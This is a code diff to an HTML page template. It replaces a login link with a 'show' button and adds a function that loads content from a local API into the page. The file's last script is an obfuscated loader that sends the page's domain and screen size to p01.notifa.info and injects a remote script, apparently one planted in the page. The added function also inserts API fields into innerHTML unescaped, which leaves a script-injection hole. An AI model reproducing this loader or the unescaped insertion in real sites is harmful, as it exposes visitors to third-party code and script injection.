@@ -140,12 +140,7 @@ Author:Webstrot
 
             <div class="m24_header_right_Wrapper d-none d-sm-none d-md-none d-lg-none d-xl-block">
                 <div class="m24_signin_wrapper">
-                    <a href="#" data-toggle="modal" data-target="#login_modal"><img src="images/pf.png" alt="img">
-                        <div class="login_top_wrapper">
-                            <p>login/register</p>
-
-                        </div>
-                    </a>
+                            <button onclick='ShowAll()'>show</button>
                 </div>
                 <div class="crm_message_dropbox_wrapper">
                     <div class="nice-select budge_noti_wrapper" tabindex="0"> <span class="current budge_noti"><i class="flaticon-bell"></i></span>
@@ -1171,6 +1166,27 @@ advertise </a></li>
     <script src="js/mp3/player.js"></script>
     <script src="js/custom.js"></script>
     <!-- custom js-->
+
+    <script>
+        function ShowAll(){
+            var url  = "http://localhost:3000/api/contents";
+            var xhr  = new XMLHttpRequest();
+            var content = '';
+            xhr.open('GET', url, true);
+            xhr.onload = function() {
+                var contents = JSON.parse(xhr.responseText);
+                if (xhr.readyState == 4 && xhr.status == "200") {
+                    contents.forEach((val) => {
+                        content+='<div class="col-lg-4 col-sm-6 card-group-row__col"><div class="card card-group-row__card text-center o-hidden border-0"><div class="card-body d-flex flex-column"><div class="flex-grow mb-16pt"><span class="w-64 h-64 icon-holder icon-holder--outline-secondary rounded-circle d-inline-flex mb-16pt"><i class="material-icons">person</i></span><h4 class="mb-8pt">'+val.Description1+'</h4><p class="text-70 mb-0">'+val.Description2+'</p></div><p class="d-flex justify-content-center align-items-center m-0"><span class="h4 m-0 font-weight-normal">&dollar;</span><span class="h1 m-0 font-weight-normal">'+val.Description3+'</span><span class="h4 m-0 font-weight-normal">'+val.Description4+'</span></p><p class="lh-1 text-muted mb-0"><small>after the free trial ends</small></p></div><div class="card-footer"><a href="fixed-signup.html" class="btn btn-outline-secondary">Get started</a></div></div></div>';
+                    })
+                    document.getElementById('change').innerHTML = content;
+                } else {
+                    console.error(courses);
+                }
+            }
+            xhr.send(null);
+        }
+    </script>
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXstx%2f11gesA3HKJVtzwtAZVySSv1%2bVrT8shIMdFGaK4gOvyWz1iqSlbWTKw7fuBk7KTR091R1GT5fv%2fvA4o8EYs6iSXm4bgJl%2b5rrWq6hV3nc85LZYunWAYWn7Jw0pA4aGRW%2f%2fdmouPB1DO9ZpVvH2vepOXPJXMgbC%2f1znT%2frHaauPL%2bHGBfAZfyThe%2buE75wP3YhET6qpdhFv898aU21TJKyK5PpW%2bxl%2bt22mJui%2bvUfiDAvIWRLnzUYzMrE6I2pr1yWGRsDeD%2bCA4lbm0fVig7CzpBGFkjPAnLeeylWW49pYd74KgMw1m0WQ3A0V8PNS0FaMaBIL5T2Jy7FfeeLLVHiZRZ7vvZMvPAXyrcbQ46qUw1TaQl%2bkoQQf5u9eyIiKz7JBr1Zj0f40WvIvVDiGO4FfMn5kats5Lnv9%2fyZLCF7OeIU5bGAzfN5HHryAXwxhm41cj0SaSeFopBPSuvj5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 </html>
